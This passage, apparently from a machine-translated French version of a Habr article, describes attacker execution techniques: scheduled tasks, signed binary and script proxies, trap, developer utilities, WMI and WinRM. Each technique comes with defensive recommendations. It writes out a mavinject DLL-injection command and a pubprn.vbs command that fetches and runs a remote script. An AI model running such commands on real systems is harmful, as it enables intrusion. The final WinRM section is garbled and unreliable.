Scheduler peuvent être utilisés pour planifier des programmes et des scripts à exécuter à une date et une heure spécifiques. Une tâche peut être planifiée sur un système distant, à condition que RPC soit utilisé pour l'authentification et que le partage d'imprimantes et de fichiers soit activé. De plus, des droits d'administrateur sont requis pour planifier des tâches sur un système distant. Les attaquants peuvent utiliser la planification de tâches à distance pour exécuter des programmes au démarrage du système ou dans le contexte d'un compte spécifique. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> activez la restriction des droits pour créer des tâches pour les utilisateurs au nom du système dans le registre: </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HKLM \ SYSTEM \ CurrentControlSet \ Control \ Lsa \ SubmitControl = 0 </font></font></i> <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Remarque:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SubmitControl = 1, permet aux membres du groupe Opérateurs de serveur de créer des travaux. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Configurez également l'objet de stratégie de groupe approprié: </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Configuration ordinateur&gt; [Stratégies]&gt; Paramètres Windows&gt; Paramètres de sécurité&gt; Stratégies locales&gt; Options de sécurité: Contrôleur de domaine: autorisez les opérateurs de serveur à planifier des tâches: désactivé </font></font></i> <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Configuration ordinateur&gt; [Politiques]&gt; Paramètres Windows&gt; Paramètres de sécurité&gt; Local Stratégies&gt; Attribution des droits utilisateur: augmentez la priorité de planification</font></font></i> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Envisagez d'utiliser PowerSploit Framework, qui contient le module PowerUP pour rechercher des vulnérabilités dans la résolution des tâches planifiées, dans votre activité.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Scripting</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description de l'</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> utilisateur </font><i><font style="vertical-align: inherit;">: Les</font></i><font style="vertical-align: inherit;"> attaquants peuvent utiliser des scripts pour automatiser leurs actions, accélérer les tâches opérationnelles et, par conséquent, réduire le temps nécessaire pour y accéder. Certains langages de script peuvent être utilisés pour contourner les mécanismes de surveillance des processus en interagissant directement avec le système d'exploitation au niveau de l'API au lieu d'appeler d'autres programmes. Les scripts peuvent être intégrés dans des documents Office sous forme de macros, puis utilisés pour des attaques de phishing. Dans ce cas, les attaquants s'attendent à ce que l'utilisateur exécute le fichier de macro ou que l'utilisateur accepte d'activer la macro. Il existe plusieurs cadres populaires pour implémenter les scripts - Metasploit, Veil, PowerSploit.</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conseils de sécurité:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> limitez l'accès aux scripts tels que VBScript ou PowerShell. </font><font style="vertical-align: inherit;">Sous Windows, configurez les paramètres de sécurité de MS Office en activant l'affichage sécurisé et l'interdiction des macros via GPO. </font><font style="vertical-align: inherit;">Si des macros sont nécessaires, autorisez uniquement l'exécution de macros signées numériquement approuvées. </font><font style="vertical-align: inherit;">Utilisez la micro-segmentation et la virtualisation des applications, par exemple, Sandboxie pour Windows et Apparmor, Docker pour Linux.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Démarrage des services (exécution du service)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> Administrateur, </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description du</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> système </font><i><font style="vertical-align: inherit;">: Les</font></i><font style="vertical-align: inherit;"> attaquants peuvent exécuter un code binaire, une commande ou un script en utilisant des méthodes spéciales d'interaction avec les services Windows, par exemple, en utilisant </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">le Gestionnaire de contrôle des services (SCM),</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> vous pouvez créer de nouveaux services et modifier ceux qui sont en cours d'exécution. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Assurez-vous que le paramètre de privilège actuel sur le système interdit le lancement de services avec des privilèges élevés à partir d'utilisateurs avec des privilèges faibles. </font><font style="vertical-align: inherit;">Assurez-vous que les fichiers exécutables avec des autorisations élevées sur le système ne peuvent pas être remplacés ou modifiés par des utilisateurs avec des autorisations inférieures. </font><font style="vertical-align: inherit;">Envisagez d'utiliser des outils pour restreindre le lancement de programmes potentiellement dangereux à l'aide d'AppLocker et configurer des </font></font><i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stratégies de restriction logicielle</font></font></a></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exécution par exécution d'un proxy binaire signé</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> Utilisateur </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Les fichiers binaires signés avec des certificats numériques approuvés peuvent être exécutés sur des systèmes Windows protégés par une vérification de signature numérique. Plusieurs fichiers Microsoft signés par défaut lors de l'installation de Windows peuvent être utilisés pour proxy le lancement d'autres fichiers: </font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mavinject.exe</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est un utilitaire Windows qui permet d'exécuter du code. Mavinject peut être utilisé pour entrer la DLL dans le processus en cours d'exécution: </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"C: \ Program Files \ Fichiers communs \ microsoft shared \ ClickToRun \ MavInject32.exe" [PID] / INJECTRUNNING [PATH DLL] </font></font></i> <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C: \ Windows \ system32 \ mavinject.exe [PID ] / INJECTRUNNING [CHEMIN DLL] </font></font></i> <br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SyncAppvPublishingServer.exe</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- peut être utilisé pour exécuter des scripts PowerShell sans exécuter PowerShell.exe. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Il existe </font></font><i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plusieurs autres fichiers binaires similaires</font></font></a></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection: de</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> nombreux fichiers signés peuvent ne pas être utilisés sur votre système, pensez donc à bloquer leur lancement.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exécution via des scripts signés (exécution du proxy de script signé)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> Utilisateurs </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description: Les</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> scripts signés avec des certificats approuvés peuvent être utilisés pour proxyer des fichiers malveillants, par exemple, </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PubPrn.vbs est</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> signé avec un certificat Microsoft et peut être utilisé pour exécuter un fichier à partir d'un serveur distant: </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cscript C: \ Windows \ System32 \ Printing_Admin_Scripts \ ru-RU \ pubprn.vbs 127.0.0.1 script: http [:] // 192.168.1.100/hi.png </font></font></i> <br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> De tels scripts signés peuvent ne pas être requis sur votre système, pensez donc à bloquer leur lancement.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Équipe source</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Linux et macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description de l'</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> utilisateur </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> Source - une commande qui vous permet de lire et d'exécuter toutes les commandes du fichier spécifié dans le shell de commande actuel, ce qui signifie que toutes les variables d'environnement spécifiées seront visibles dans tous les scripts et commandes qui seront lancés. La source peut être démarrée de deux manières: </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">source / chemin / vers / nom de fichier [arguments]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ou </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. / path / to / filename [arguments]</font></font></i> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Notez l'espace après le point. Sans espace, le programme sera lancé dans un nouveau shell de commande. Les attaquants peuvent utiliser Source pour exécuter des fichiers non marqués du drapeau «x» en tant que fichiers exécutables. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Il est assez difficile d'empêcher l'utilisation de commandes intégrées dans le système en raison de leur légalité.Par conséquent, le vecteur de protection doit viser à empêcher les actions malveillantes aux stades antérieurs de l'attaque, par exemple au stade de la livraison ou de la création d'un fichier malveillant dans le système. </font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Espace après le nom de fichier</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits: </font></font></i><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">Description de l'</font></i><font style="vertical-align: inherit;"> utilisateur </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Les attaquants peuvent masquer le vrai type d'un fichier en modifiant son extension. Pour certains types de fichiers (ne fonctionne pas avec les fichiers .app), l'ajout d'un caractère espace à la fin du nom de fichier changera la façon dont le fichier est traité par le système d'exploitation. Par exemple, s'il existe un fichier exécutable Mach-O avec le nom evil.bin, alors lorsque l'utilisateur double-clique, le système d'exploitation lancera Terminal.app et l'exécutera. Si le même fichier est renommé evil.txt, alors avec un double-clic il démarrera dans un éditeur de texte. Cependant, si le fichier est renommé «evil.txt» (un espace à la fin), puis en double-cliquant sur le type du vrai fichier, le système d'exploitation sera déterminé et le fichier binaire démarrera. Les attaquants peuvent utiliser cette technique pour inciter un utilisateur à lancer un fichier exécutable malveillant. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L'utilisation de cette technique est difficile à empêcher car </font><font style="vertical-align: inherit;">un attaquant utilise des mécanismes de fonctionnement standard du système d'exploitation, de sorte que le vecteur de protection doit viser à empêcher des actions malveillantes à des stades antérieurs de l'attaque, par exemple au stade de la livraison ou de la création d'un fichier malveillant dans le système.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exécution à l'aide d'un logiciel d'administration réseau tiers (logiciel tiers)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> utilisateur, administrateur, </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">description du</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> système </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> le vecteur d'attaque est dirigé vers des logiciels tiers et des systèmes de déploiement de logiciels utilisés dans le réseau attaqué à des fins administratives (SCCM, VNC, HBSS, Altris, etc.). Dans le cas où un attaquant accède à de tels systèmes, l'adversaire peut exécuter du code à distance sur tous les hôtes connectés au système de déploiement de logiciels. Les droits requis pour implémenter cette technique dépendent de la configuration particulière du système. Les informations d'identification locales peuvent être suffisantes pour accéder au serveur de déploiement de logiciels; cependant, un compte administrateur peut être requis pour démarrer le déploiement de logiciels. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vérifiez le niveau de sécurité de vos systèmes de déploiement de logiciels. </font><font style="vertical-align: inherit;">Assurez-vous que l'accès aux systèmes de gestion de logiciels est limité, contrôlé et protégé. </font><font style="vertical-align: inherit;">Utilisez strictement les politiques de pré-approbation obligatoires pour le déploiement de logiciels à distance. </font><font style="vertical-align: inherit;">Donner accès aux systèmes de déploiement logiciel à un nombre limité d'administrateurs, assurer l'isolement du système de déploiement logiciel. </font><font style="vertical-align: inherit;">Assurez-vous que les informations d'identification pour l'accès au système de déploiement de logiciels sont uniques et ne sont pas utilisées dans d'autres services sur le réseau d'entreprise. </font><font style="vertical-align: inherit;">Si le système de déploiement logiciel est configuré pour exécuter uniquement des fichiers binaires signés, vérifiez que les certificats approuvés ne sont pas stockés dans le système de déploiement logiciel lui-même, mais se trouvent sur un système inaccessible à distance.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Équipe de piège</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> utilisateur, administrateur </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> La commande trap protège le script des interruptions (ctrl + c, ctrl + d, ctrl + z, etc.). Si le script reçoit un signal d'interruption spécifié dans les arguments de la commande trap, alors il traite lui-même le signal d'interruption, tandis que le shell ne traitera pas un tel signal. Les attaquants peuvent utiliser trap pour enregistrer le code qui sera exécuté lorsque le shell recevra certains signaux d'interruption. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L'utilisation de cette technique est difficile à empêcher, car l'attaquant utilise les mécanismes standards de l'OS. </font><font style="vertical-align: inherit;">Le vecteur de protection doit viser à empêcher les actions malveillantes aux stades antérieurs de l'attaque, par exemple au stade de la livraison ou de la création d'un fichier malveillant dans le système.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exécution via Trusted Developer Utilities</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font><i><font style="vertical-align: inherit;">:</font></i><font style="vertical-align: inherit;"> Utilisateur </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Il existe de nombreux utilitaires utilisés par les développeurs de logiciels et qui peuvent être utilisés pour exécuter du code sous diverses formes lors du développement de logiciels, du débogage et de l'ingénierie inverse. Ces utilitaires sont souvent signés avec des certificats numériques qui leur permettent de proxyer du code malveillant dans le système d'exploitation, en contournant les mécanismes de sécurité et les feuilles blanches d'applications. </font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Msbulid</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Est une plate-forme de développement logiciel utilisée dans Visual Studio. Il utilise des projets sous forme de fichiers XML qui décrivent les exigences pour la construction de diverses plates-formes et configurations. MSBuild de .NET version 4 vous permet d'insérer du code C # dans un projet XML, de le compiler, puis de l'exécuter. MSBulid.exe est signé par Microsoft Digital Certificate. </font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNX</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - .Net Execution Environmant (dnx.exe) est un kit de développement pour Visual Studio Enterprise. Arrêté depuis la CLI .NET Core en 2016. DNX est absent des versions standard de Windows et ne peut être présent que sur les hôtes développeurs lors de l'utilisation de .Net Core et ASP.NET Core 1.0. Dnx.exe est signé numériquement et peut être utilisé pour exécuter du code proxy. </font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RCSI</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- interface de ligne de commande non interactive pour C #, similaire à csi.exe. Il a été introduit dans une version antérieure de la plate-forme de compilation Roslyn .Net. Rcsi.exe est signé par Microsoft Digital Certificate. Les fichiers de script C # .csx peuvent être écrits et exécutés à l'aide de Rcsi.exe à l'invite de commandes Windows. </font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinDbg / CDB</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> est le noyau MS Windows et un utilitaire de débogage en mode utilisateur. Le débogueur de console Microsoft cdb.exe est également un débogueur en mode utilisateur. Les deux utilitaires peuvent être utilisés comme des outils autonomes. Couramment utilisé dans le développement de logiciels, l'ingénierie inverse et ne peut pas être trouvé sur les systèmes Windows standard. Les fichiers WinDbg.exe et CDB.exe sont signés par Microsoft Digital Certificate et peuvent être utilisés pour le code proxy. </font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tracker</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- utilitaire de suivi des fichiers tracker.exe. </font><font style="vertical-align: inherit;">Inclus dans .NET dans le cadre de MSBuild. </font><font style="vertical-align: inherit;">Utilisé pour enregistrer les appels dans le système de fichiers Windows 10. Les attaquants peuvent utiliser tracker.exe pour exécuter DLL dans divers processus. </font><font style="vertical-align: inherit;">Tracker.exe est également signé avec un certificat Microsoft. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> tous les fichiers ci-dessus doivent être supprimés du système s'ils ne sont pas utilisés aux fins prévues par les utilisateurs.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exécution utilisateur</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits: </font></font></i><font style="vertical-align: inherit;"></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description de l'</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> utilisateur </font><i><font style="vertical-align: inherit;">: Les</font></i><font style="vertical-align: inherit;"> attaquants peuvent compter sur certaines actions de l'utilisateur pour effectuer certaines actions. Il peut s'agir de l'exécution directe de code lorsqu'un utilisateur ouvre un fichier exécutable malveillant fourni sous forme de pièce jointe de phishing avec une icône et une extension de fichier de document visible. Parfois, d'autres techniques peuvent être utilisées, par exemple, lorsqu'un utilisateur clique sur un lien dans un e-mail de phishing, ce qui conduit à l'exploitation d'une vulnérabilité de navigateur. La technique de «l'exécution de l'utilisateur» est souvent utilisée à d'autres étapes de l'invasion, par exemple lorsqu'un attaquant place un fichier dans un répertoire partagé ou sur le bureau de l'utilisateur, en espérant qu'il «clique» dessus.</font></font><br><br> <i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conseils de </font><i><font style="vertical-align: inherit;">protection:</font></i><font style="vertical-align: inherit;"> sensibilisez les utilisateurs. </font><font style="vertical-align: inherit;">Blocage du téléchargement de fichiers tels que .scr, .exe, .pif, .cpl, etc. </font><font style="vertical-align: inherit;">L'utilisation d'un logiciel antivirus et la mise en œuvre de systèmes IPS.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Instrumentation de gestion Windows (WMI)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Système:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Droits:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> utilisateur, administrateur </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> WMI est un outil d'administration de Windows qui fournit un accès local et à distance aux composants du système Windows. WMI utilise SMB et RPCS (s'exécute sur le port 135). Les attaquants peuvent utiliser WMI pour interagir avec des systèmes locaux et distants, et également comme moyen d'effectuer de nombreuses opérations tactiques, telles que la collecte d'informations au stade de la revue des ressources (découverte) et l'exécution de fichiers à distance pendant le "mouvement littéral". </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recommandations de protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">La désactivation de WMI et de RPCS peut entraîner une instabilité du système. </font><font style="vertical-align: inherit;">Par défaut, seuls les administrateurs peuvent se connecter à distance au système via WMI. </font><font style="vertical-align: inherit;">Empêchez la duplication des privilèges entre les comptes administratifs et autres comptes privilégiés.</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Gestion à distance de Windows (WinRM)</font></font></a> </h3><br> <i>:</i> Windows <br> <i>:</i> ,  <br> <i>:</i> Windows Remote Management (WinRM) —     ,        (,  ,  ,  .     winrm   ,   PowerShell. <br><br> <i>  :</i>   WinRM.   ,     WinRM      .  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="> WinRM</a></i>         ,     WinRM    . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr424027/">https://habr.com/ru/post/fr424027/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr424017/index.html">Percer le complexe: une feuille de route pour une collaboration efficace</a></li>
<li><a href="../fr424019/index.html">Ancien ordinateur, Windows 7, 1 Go de RAM, Firefox et Internet</a></li>
<li><a href="../fr424021/index.html">Défis des programmes d'auto-apprentissage et comment les surmonter</a></li>
<li><a href="../fr424023/index.html">Nous automatisons l'assemblage d'applications iOS à l'aide de Fastlane</a></li>
<li><a href="../fr424025/index.html">Routage dans une grande application React</a></li>
<li><a href="../fr424029/index.html">Et encore une fois sur la paresse</a></li>
<li><a href="../fr424031/index.html">Programmation réactive avec JAX-RS</a></li>
<li><a href="../fr424033/index.html">Que fait Kotlin: une entrevue avec Andrei Breslav</a></li>
<li><a href="../fr424035/index.html">2019 est l'année où Intel s'est arrêté</a></li>
<li><a href="../fr424037/index.html">Une brève visite de GraphQL</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>